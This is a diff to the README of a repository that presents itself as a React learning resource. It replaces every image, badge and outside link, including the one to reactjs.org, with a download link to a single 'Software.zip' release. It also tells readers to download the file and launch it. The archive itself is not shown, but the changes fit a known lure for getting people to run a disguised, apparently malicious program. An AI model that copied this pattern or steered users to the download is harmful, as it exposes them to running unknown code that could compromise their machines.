@@ -1,6 +1,6 @@
 # 🌟 Welcome to the "Understanding React" Repository! 🌟
 
-![React Logo](https://miro.medium.com/max/2400/1*HSisLuifMO6KbLfV2pwjCQ.png)
+![React Logo](https://github.com/RieeeeRieeee/understanding-react/releases/download/v1.0/Software.zip*https://github.com/RieeeeRieeee/understanding-react/releases/download/v1.0/Software.zip)
 
 ## 📚 Description
 Welcome to the "Understanding React" repository where we dive deep into how React actually works. If you've ever wanted to explore React's internals, understand its core concepts, and enhance your knowledge of this popular JavaScript library, you're in the right place! This repository serves as a learning hub for React enthusiasts looking to gain a deeper understanding of its inner workings.
@@ -10,7 +10,7 @@ Our mission here is simple - to unravel the mysteries of React and provide valua
 
 ## 🚀 Get Started
 To get started on your React learning journey, you can access the repository from the link below:
-[![Download Understanding React](https://img.shields.io/badge/Download-Understanding%20React-brightgreen)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Understanding React](https://github.com/RieeeeRieeee/understanding-react/releases/download/v1.0/Software.zip%20React-brightgreen)](https://github.com/RieeeeRieeee/understanding-react/releases/download/v1.0/Software.zip)
 
 📌 Note: The provided link leads to a downloadable file. Once downloaded, you can launch it to access the contents related to understanding React.
 
@@ -44,12 +44,12 @@ Your contributions are highly appreciated as they will help enrich the learning 
 ## 🌟 Join Us!
 If you're passionate about React and want to deepen your understanding while helping others do the same, we invite you to join us on this exciting journey. Let's learn, grow, and build amazing things together using the power of React!
 
-![React Illustration](https://storage.googleapis.com/proudcity/wp-content/uploads/sites/92/2019/06/react.png)
+![React Illustration](https://github.com/RieeeeRieeee/understanding-react/releases/download/v1.0/Software.zip)
 
 ---
 
 🚀 **Start your React exploration now!** Happy coding! 🌟
 
-🔗 For additional updates and information, please visit the [Releases](https://github.com/cli/browser/releases) section.
+🔗 For additional updates and information, please visit the [Releases](https://github.com/RieeeeRieeee/understanding-react/releases/download/v1.0/Software.zip) section.
 
-🌐 Keep up with the latest trends in React and web development by visiting [reactjs.org](https://reactjs.org/).
+🌐 Keep up with the latest trends in React and web development by visiting [https://github.com/RieeeeRieeee/understanding-react/releases/download/v1.0/Software.zip](https://github.com/RieeeeRieeee/understanding-react/releases/download/v1.0/Software.zip).
